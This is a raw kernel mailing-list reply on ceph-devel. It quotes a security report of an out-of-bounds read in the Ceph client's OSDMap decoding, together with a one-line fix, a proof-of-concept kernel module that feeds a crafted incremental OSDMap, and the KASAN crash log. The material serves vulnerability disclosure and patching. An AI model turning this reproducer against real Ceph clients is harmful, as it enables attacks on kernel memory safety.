Received: from mail-yw1-f181.google.com (mail-yw1-f181.google.com [209.85.128.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4C9DC2D3739
	for <ceph-devel@vger.kernel.org>; Sat, 25 Jul 2026 06:14:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784960054; cv=none; b=hr+pMrBD4XgWxbzoR0lVpwk82VIB7Ug9tfbMCHYwJuo4M7z+3rykDe00rmeLlppZ7vDHV/lUCebLSqingNLjnWVYHDdnQFIvOMYhXQ7OmxpcIkcCbkgT1wDKZqrf7gbH4KSo+k9F3egbP97y6WBmRfMdCsDCYT5U/AhLqbXfsbs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784960054; c=relaxed/simple;
	bh=Whv/mFYgyjptOkN5OtDwR6Q0P1uflh4o4UWU2gjuaF0=;
	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
	 Content-Type:MIME-Version; b=rq08TGelxGmNUdzDvHQ+dbM7n6/9im+UjRvjL6Lf7J2yaziudJot2IBSlekQfkhslWBDzsp1Re98zXyf8iW30xqIz2QJ1y4sTh2/URbqmxQ2w2vywYxBSOYXqSaFUhftkKaDZEbUSaPHOuLqvmcdfgM76zvH6VbM0jFSJlCmcp4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=dubeyko.com; spf=pass smtp.mailfrom=dubeyko.com; dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b=QdoRlJtS; arc=none smtp.client-ip=209.85.128.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=dubeyko.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=dubeyko.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b="QdoRlJtS"
Received: by mail-yw1-f181.google.com with SMTP id 00721157ae682-81e9f7491ffso12175417b3.0
        for <ceph-devel@vger.kernel.org>; Fri, 24 Jul 2026 23:14:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dubeyko-com.20251104.gappssmtp.com; s=20251104; t=1784960051; x=1785564851; darn=vger.kernel.org;
        h=mime-version:user-agent:content-transfer-encoding:content-type
         :autocrypt:references:in-reply-to:date:cc:to:from:subject:message-id
         :from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=n42nRWODHRGfjLQrHku0tYCI4eryOw47MbaSBNtB1ow=;
        b=QdoRlJtSoSOQeWfZBTUmoXeW6+Nf4wCJai5nQfygAn2QnTa241H/9oAnZTBTax3OEj
         hiFogmfbiuh4TWJQ6p1dFOwpln8z4sFTx3knefcJ++zpGdGiSzP33zj4tOjjrrcfNWcx
         U3ZjF+WWtPeIQKZOdnP8IfKJntmkBvnQcGCuX2QCocZPiju7/bH84DKyqkXNalGIw/RK
         EhvJ8sc6Zo7MQ5jnI54JEEj1MlCYe0PoZnHO4/UMrR0aPmKi72JY6OA8cTNCjlJzNflD
         4Vgnb3o5iffIMowAbs/XrFT0Ay94QH40Hm5COIfEyk+lVz7EjHTa8fM6Isv+wnvf9Ve2
         gAHQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784960051; x=1785564851;
        h=mime-version:user-agent:content-transfer-encoding:content-type
         :autocrypt:references:in-reply-to:date:cc:to:from:subject:message-id
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=n42nRWODHRGfjLQrHku0tYCI4eryOw47MbaSBNtB1ow=;
        b=B7jIWYufqVny3RDfQrQHz5PX2ZMxe8v2EBehad87S6BsgBamEdLD9sux1N+XMKvk/T
         f5a+nSS2z+KB0fyt4MkVNRCiMSeo19ts2cGqNGQ9M1NrChYOZVG0+DV1HD4AEcY9Hgd2
         wzvt1fam3r3oiluVONRnZmuSSK0XYUN68xxG/vy3n6IIgUtVVO9pqpams4ttL24VkO+r
         LJM1vLdD8/IRgIYGAV+joZgnGfFuLReMMSt/0FMY9/cBLb96Qrlj3VWBy5bRadgic65t
         7Mjx/1jn0bPFNOY8L43tw3wqP5VTiX8wzK1XN+oapwmIvq6X06lpE2tiEDCl/2ytcbmd
         V1BQ==
X-Forwarded-Encrypted: i=1; AHgh+RrMXcwyJ32nif3bKmq3uok1Erpax6pm71MC65L4e3jzzH37EjauLWJUeO5q+xJYqEJkHDF8btitXsfL@vger.kernel.org
X-Gm-Message-State: AOJu0YymMYqs8/wQRJmd96Pk5QQXaJZ5jjWC+zpGZ/jUCoyNaqgoBQdb
	guo66rR7KJnUdZx8vHNqAIWEm3TpZnFUljHK7fgXFL3ic2J0/o4XTG/S8+US+a+aK7o=
X-Gm-Gg: AR+sD12TabxzsfvfnYL1ad0S941zfCy1L7ACyvu0Ny0KpZHijaf6K1BWhN83xx/laeK
	f6igRjP2b6QjLEtpOgd41RL8BG9SOIHUWVbR+TT8B7Bzcc0USMgx+JGN5vCcjphzq4oCbbZF0zB
	BpoMYt0s8uv6MWekeTfPaN647z/LweCswtZ58hl/UBt78zG/P6tCpAfnC2ZLYyFboxU7guPd9gf
	aTjkbu71UfEvWa4NyzFB+tmN+OVUEnNFWdZSoz2XJrhH4mN0L8z5YQG2SLFk7Yf24fBpPU0lIdO
	CxuycrDlsK95IEE9syX+ALHsq9KZx38fvk+srKFhieaDj3K8JupOvkrcnTKJO0WmAsQg8VW2kx5
	SvFryH951t/wkb1iEQqRizDDjcCbdjX3PFCYvqwqqXpWgWm3KdPSef+Bf534lJeDExU4pzbDsOa
	IRfeGvFBMy45HKs6TcYMRH48yylLMsD8I1iIuDlg4efM1dKuQ9CgSFsYq4FQbCoApJhEHCMPOwz
	XKBliZSOsVZnJYc0pvMyoZhIHIP+XTpmilO/hUg74waPc8HGz8o7P3HPZbuVAOt0QmbQybxANyO
	jTfwAQ==
X-Received: by 2002:a05:690c:9689:b0:81e:d8ec:d855 with SMTP id 00721157ae682-81f69e8501amr4671877b3.62.1784960051133;
        Fri, 24 Jul 2026 23:14:11 -0700 (PDT)
Received: from ?IPv6:2600:1700:6476:1430:62ee:74f6:cfbb:28e0? ([2600:1700:6476:1430:62ee:74f6:cfbb:28e0])
        by smtp.gmail.com with ESMTPSA id 00721157ae682-81f658fda9fsm9008437b3.39.2026.07.24.23.14.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 24 Jul 2026 23:14:09 -0700 (PDT)
Message-ID: <588302e854ade46991dc0516b9832ea7669f3aa8.camel@dubeyko.com>
Subject: Re: [Security][Ceph] OSDMap new_state decode overflow causes
 out-of-bounds read in kernel client
From: Viacheslav Dubeyko <slava@dubeyko.com>
To: Baul Lee <baul.lee@xbow.com>
Cc: Ilya Dryomov <idryomov@gmail.com>, Alex Markuze <amarkuze@redhat.com>, 
	ceph-devel@vger.kernel.org
Date: Fri, 24 Jul 2026 23:14:04 -0700
In-Reply-To: <CAEM_DMEY7LqEA5a_YM+58HkHBnWfCk1BfAnzZ9XZzqOmbuCxTw@mail.gmail.com>
References: 
	<CALhuxzfVV=O7z_at9wf0HeU1Mk8fvi_1OHhH1M3Conv9ae6sJw@mail.gmail.com>
	 <89b78fe1d23d6a05567e51f83efae1258ac0ad97.camel@dubeyko.com>
	 <CAEM_DMHARz62F-Ow0vM6PdKnGcShhY3HjHOZFgSV34QM9VH5gw@mail.gmail.com>
	 <CAEM_DMEY7LqEA5a_YM+58HkHBnWfCk1BfAnzZ9XZzqOmbuCxTw@mail.gmail.com>
Autocrypt: addr=slava@dubeyko.com; prefer-encrypt=mutual;
 keydata=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
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
User-Agent: Evolution 3.60.1 (by Flathub.org) 
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0

On Sat, 2026-07-25 at 14:47 +0900, Baul Lee wrote:
> fix.patch
> --- a/net/ceph/osdmap.c
> +++ b/net/ceph/osdmap.c
> @@ -1902,6 +1902,7 @@ static int decode_new_up_state_weight(void **p,
> void *end, u8 struct_v,
> =C2=A0 s32 osd;
> =C2=A0 u32 xorstate;
> =C2=A0
> + ceph_decode_need(p, end, sizeof(u32) + (struct_v >=3D 5 ? sizeof(u32)
> : sizeof(u8)), e_inval);
> =C2=A0 osd =3D ceph_decode_32(p);
> =C2=A0 if (osd >=3D map->max_osd)
> =C2=A0 goto e_inval;
> poc.c
> // SPDX-License-Identifier: GPL-2.0
> #include <linux/module.h>
> #include <linux/kernel.h>
> #include <linux/slab.h>
> #include <linux/mm.h>
> #include <linux/ceph/osdmap.h>
> #include <linux/ceph/decode.h>
>=20
> static void put8(u8 **q, u8 v) =C2=A0 { **q =3D v; *q +=3D 1; }
> static void put32(u8 **q, u32 v) { __le32 le =3D cpu_to_le32(v);
> memcpy(*q, &le, 4); *q +=3D 4; }
> static void put64(u8 **q, u64 v) { __le64 le =3D cpu_to_le64(v);
> memcpy(*q, &le, 8); *q +=3D 8; }
>=20
> #define MAXOSD 8u
>=20
> static int __init poc_init(void)
> {
> =C2=A0struct ceph_osdmap *map, *ret;
> =C2=A0u8 *buf, *q;
> =C2=A0void *p, *end;
> =C2=A0size_t len;
> =C2=A0int i;
>=20
> =C2=A0map =3D ceph_osdmap_alloc();
> =C2=A0if (!map)
> =C2=A0return -ENOMEM;
>=20
> =C2=A0len =3D 12 + (16+4+8+8+4) + (4+4+4) + (4+4+4) + (4+4+4);
> =C2=A0buf =3D kvmalloc(len, GFP_KERNEL);
> =C2=A0if (!buf) {
> =C2=A0ceph_osdmap_destroy(map);
> =C2=A0return -ENOMEM;
> =C2=A0}
> =C2=A0q =3D buf;
>=20
> =C2=A0put8(&q, 7); put8(&q, 7); put32(&q, 0);
> =C2=A0put8(&q, 7); put8(&q, 1); put32(&q, 0);
>=20
> =C2=A0for (i =3D 0; i < 16; i++)
> =C2=A0put8(&q, 0);
> =C2=A0put32(&q, 1);
> =C2=A0put32(&q, 0); put32(&q, 0);
> =C2=A0put64(&q, (u64)-1);
> =C2=A0put32(&q, (u32)-1);
> =C2=A0put32(&q, 0);
> =C2=A0put32(&q, 0);
> =C2=A0put32(&q, MAXOSD);
> =C2=A0put32(&q, 0);
> =C2=A0put32(&q, 0);
> =C2=A0put32(&q, 0);
>=20
> =C2=A0put32(&q, 0);
> =C2=A0put32(&q, 0x20000000u);
> =C2=A0put32(&q, 0);
>=20
> =C2=A0BUG_ON((size_t)(q - buf) !=3D len);
>=20
> =C2=A0p =3D buf;
> =C2=A0end =3D buf + len;
> =C2=A0ret =3D osdmap_apply_incremental(&p, end, false, map);
> =C2=A0if (!IS_ERR(ret))
> =C2=A0map =3D ret;
> =C2=A0ceph_osdmap_destroy(map);
> =C2=A0kvfree(buf);
> =C2=A0return 0;
> }
>=20
> static void __exit poc_exit(void) { }
>=20
> module_init(poc_init);
> module_exit(poc_exit);
> MODULE_LICENSE("GPL");
> MODULE_DESCRIPTION("KASAN PoC: ceph decode_new_up_state_weight OOB
> read");
> KASAN
> Linux 7.2.0-rc2 (origin/master 0e35b9b6ec0f), arm64, CONFIG_KASAN=3Dy
> CONFIG_CEPH_LIB=3Dm. QEMU virt.
> Reproducer: poc/poc.c (minimized) feeds a crafted incremental OSDMap
> to the unmodified
> osdmap_apply_incremental() -> decode_new_up_state_weight() path (the
> exact bytes a malicious
> ceph monitor's MSG_OSD_MAP would decode); the vulnerable function is
> byte-for-byte unmodified.
>=20
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> BUG: KASAN: slab-out-of-bounds in
> decode_new_up_state_weight+0x3f8/0x900 [libceph]
> Read of size 4 at addr ffff000019a51264 by task insmod/241
>=20
> CPU: 1 UID: 0 PID: 241 Comm: insmod Tainted: G =C2=A0 =C2=A0B =C2=A0 =C2=
=A0 =C2=A0OE =C2=A0 =C2=A0 =C2=A0
> 7.0.0 #5 PREEMPT(lazy)
> Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE, [E]=3DUNSIGNED_MODULE
> Hardware name: linux,dummy-virt (DT)
> Call trace:
> =C2=A0show_stack+0x24/0x50 (C)
> =C2=A0dump_stack_lvl+0x80/0xc0
> =C2=A0print_report+0x164/0x4e8
> =C2=A0kasan_report+0xb0/0x128
> =C2=A0kasan_check_range+0x114/0x200
> =C2=A0__asan_loadN+0x20/0x48
> =C2=A0decode_new_up_state_weight+0x3f8/0x900 [libceph]
> =C2=A0osdmap_apply_incremental+0x3d4/0xa28 [libceph]
> =C2=A0poc_init+0x23c/0xf70 [ceph_osdmap_poc]
> =C2=A0do_one_initcall+0xb4/0x6a0
> =C2=A0do_init_module+0x1c4/0x4c8
> =C2=A0load_module+0x30b4/0x37e8
> =C2=A0init_module_from_file+0x190/0x1f8
> =C2=A0__arm64_sys_finit_module+0x304/0x4e0
> =C2=A0invoke_syscall.constprop.0+0xa8/0x188
> =C2=A0el0_svc_common.constprop.0+0x80/0x178
> =C2=A0do_el0_svc+0x3c/0x70
> =C2=A0el0_svc+0x44/0x140
> =C2=A0el0t_64_sync_handler+0xc0/0x110
> =C2=A0el0t_64_sync+0x1b8/0x1c0
>=20
> Allocated by task 241:
> =C2=A0kasan_save_stack+0x44/0x88
> =C2=A0kasan_save_track+0x24/0x58
> =C2=A0kasan_save_alloc_info+0x48/0x90
> =C2=A0__kasan_kmalloc+0xd8/0x110
> =C2=A0__kvmalloc_node_noprof+0x23c/0x7f0
> =C2=A0poc_init+0xb4/0xf70 [ceph_osdmap_poc] =C2=A0 =C2=A0 =C2=A0 =C2=A0<-=
 the crafted 88-byte
> inc-osdmap buffer
>=20
> The buggy address belongs to the object at ffff000019a51200
> =C2=A0which belongs to the cache kmalloc-rnd-08-96 of size 96
> The buggy address is located 12 bytes to the right of
> =C2=A0allocated 88-byte region [ffff000019a51200, ffff000019a51258)
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> 2026=EB=85=84 7=EC=9B=94 25=EC=9D=BC (=ED=86=A0) =EC=98=A4=ED=9B=84 2:44,=
 Baul Lee <baul.lee@xbow.com>=EB=8B=98=EC=9D=B4 =EC=9E=91=EC=84=B1:
> > fix.patch--- a/net/ceph/osdmap.c
> > +++ b/net/ceph/osdmap.c
> > @@ -1902,6 +1902,7 @@ static int decode_new_up_state_weight(void
> > **p, void *end, u8 struct_v,
> > =C2=A0		s32 osd;
> > =C2=A0		u32 xorstate;
> > =C2=A0
> > +		ceph_decode_need(p, end, sizeof(u32) + (struct_v
> > >=3D 5 ? sizeof(u32) : sizeof(u8)), e_inval);
> > =C2=A0		osd =3D ceph_decode_32(p);
> > =C2=A0		if (osd >=3D map->max_osd)
> > =C2=A0			goto e_inval;
> > poc.c// SPDX-License-Identifier: GPL-2.0
> > #include <linux/module.h>
> > #include <linux/kernel.h>
> > #include <linux/slab.h>
> > #include <linux/mm.h>
> > #include <linux/ceph/osdmap.h>
> > #include <linux/ceph/decode.h>
> >=20
> > static void put8(u8 **q, u8 v)   { **q =3D v; *q +=3D 1; }
> > static void put32(u8 **q, u32 v) { __le32 le =3D cpu_to_le32(v);
> > memcpy(*q, &le, 4); *q +=3D 4; }
> > static void put64(u8 **q, u64 v) { __le64 le =3D cpu_to_le64(v);
> > memcpy(*q, &le, 8); *q +=3D 8; }
> >=20
> > #define MAXOSD 8u
> >=20
> > static int __init poc_init(void)
> > {
> > 	struct ceph_osdmap *map, *ret;
> > 	u8 *buf, *q;
> > 	void *p, *end;
> > 	size_t len;
> > 	int i;
> >=20
> > 	map =3D ceph_osdmap_alloc();
> > 	if (!map)
> > 		return -ENOMEM;
> >=20
> > 	len =3D 12 + (16+4+8+8+4) + (4+4+4) + (4+4+4) + (4+4+4);
> > 	buf =3D kvmalloc(len, GFP_KERNEL);
> > 	if (!buf) {
> > 		ceph_osdmap_destroy(map);
> > 		return -ENOMEM;
> > 	}
> > 	q =3D buf;
> >=20
> > 	put8(&q, 7); put8(&q, 7); put32(&q, 0);
> > 	put8(&q, 7); put8(&q, 1); put32(&q, 0);
> >=20
> > 	for (i =3D 0; i < 16; i++)
> > 		put8(&q, 0);
> > 	put32(&q, 1);
> > 	put32(&q, 0); put32(&q, 0);
> > 	put64(&q, (u64)-1);
> > 	put32(&q, (u32)-1);
> > 	put32(&q, 0);
> > 	put32(&q, 0);
> > 	put32(&q, MAXOSD);
> > 	put32(&q, 0);
> > 	put32(&q, 0);
> > 	put32(&q, 0);
> >=20
> > 	put32(&q, 0);
> > 	put32(&q, 0x20000000u);
> > 	put32(&q, 0);
> >=20
> > 	BUG_ON((size_t)(q - buf) !=3D len);
> >=20
> > 	p =3D buf;
> > 	end =3D buf + len;
> > 	ret =3D osdmap_apply_incremental(&p, end, false, map);
> > 	if (!IS_ERR(ret))
> > 		map =3D ret;
> > 	ceph_osdmap_destroy(map);
> > 	kvfree(buf);
> > 	return 0;
> > }
> >=20
> > static void __exit poc_exit(void) { }
> >=20
> > module_init(poc_init);
> > module_exit(poc_exit);
> > MODULE_LICENSE("GPL");
> > MODULE_DESCRIPTION("KASAN PoC: ceph decode_new_up_state_weight OOB
> > read");
> > KASANLinux 7.2.0-rc2 (origin/master 0e35b9b6ec0f), arm64,
> > CONFIG_KASAN=3Dy CONFIG_CEPH_LIB=3Dm. QEMU virt.
> > Reproducer: poc/poc.c (minimized) feeds a crafted incremental
> > OSDMap to the unmodified
> > osdmap_apply_incremental() -> decode_new_up_state_weight() path
> > (the exact bytes a malicious
> > ceph monitor's MSG_OSD_MAP would decode); the vulnerable function
> > is byte-for-byte unmodified.
> >=20
> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> > BUG: KASAN: slab-out-of-bounds in
> > decode_new_up_state_weight+0x3f8/0x900 [libceph]
> > Read of size 4 at addr ffff000019a51264 by task insmod/241
> >=20
> > CPU: 1 UID: 0 PID: 241 Comm: insmod Tainted: G    B      OE     =20
> > 7.0.0 #5 PREEMPT(lazy)
> > Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE, [E]=3DUNSIGNED_MODULE
> > Hardware name: linux,dummy-virt (DT)
> > Call trace:
> > =C2=A0show_stack+0x24/0x50 (C)
> > =C2=A0dump_stack_lvl+0x80/0xc0
> > =C2=A0print_report+0x164/0x4e8
> > =C2=A0kasan_report+0xb0/0x128
> > =C2=A0kasan_check_range+0x114/0x200
> > =C2=A0__asan_loadN+0x20/0x48
> > =C2=A0decode_new_up_state_weight+0x3f8/0x900 [libceph]
> > =C2=A0osdmap_apply_incremental+0x3d4/0xa28 [libceph]
> > =C2=A0poc_init+0x23c/0xf70 [ceph_osdmap_poc]
> > =C2=A0do_one_initcall+0xb4/0x6a0
> > =C2=A0do_init_module+0x1c4/0x4c8
> > =C2=A0load_module+0x30b4/0x37e8
> > =C2=A0init_module_from_file+0x190/0x1f8
> > =C2=A0__arm64_sys_finit_module+0x304/0x4e0
> > =C2=A0invoke_syscall.constprop.0+0xa8/0x188
> > =C2=A0el0_svc_common.constprop.0+0x80/0x178
> > =C2=A0do_el0_svc+0x3c/0x70
> > =C2=A0el0_svc+0x44/0x140
> > =C2=A0el0t_64_sync_handler+0xc0/0x110
> > =C2=A0el0t_64_sync+0x1b8/0x1c0
> >=20
> > Allocated by task 241:
> > =C2=A0kasan_save_stack+0x44/0x88
> > =C2=A0kasan_save_track+0x24/0x58
> > =C2=A0kasan_save_alloc_info+0x48/0x90
> > =C2=A0__kasan_kmalloc+0xd8/0x110
> > =C2=A0__kvmalloc_node_noprof+0x23c/0x7f0
> > =C2=A0poc_init+0xb4/0xf70 [ceph_osdmap_poc]        <- the crafted 88-
> > byte inc-osdmap buffer
> >=20
> > The buggy address belongs to the object at ffff000019a51200
> > =C2=A0which belongs to the cache kmalloc-rnd-08-96 of size 96
> > The buggy address is located 12 bytes to the right of
> > =C2=A0allocated 88-byte region [ffff000019a51200, ffff000019a51258)

Please, follow to this guidance [1]. This is not the formal patch.

Thanks,
Slava.

[1] https://docs.kernel.org/process/submitting-patches.html

